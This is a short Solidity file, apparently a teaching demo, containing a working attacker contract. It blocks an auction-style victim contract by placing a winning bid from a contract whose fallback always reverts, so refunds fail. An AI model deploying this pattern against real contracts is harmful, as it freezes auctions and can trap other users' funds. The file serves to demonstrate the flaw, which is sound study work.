// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/// This contract will attack the vulnerable contract to demo DoS
contract AttackerContract{
    VictimContract victimContract;
    constructor(VictimContract _victimContract) {
        victimContract = _victimContract;
    }
    /// Prevent this contract from taking ETH
    fallback() external payable {
        revert();
    }
    /// Place a bid to the vulnerable contract
    function Bid() external payable {
        require(msg.value > victimContract.winnerBid());
        victimContract.bid{value: msg.value}();
    }
}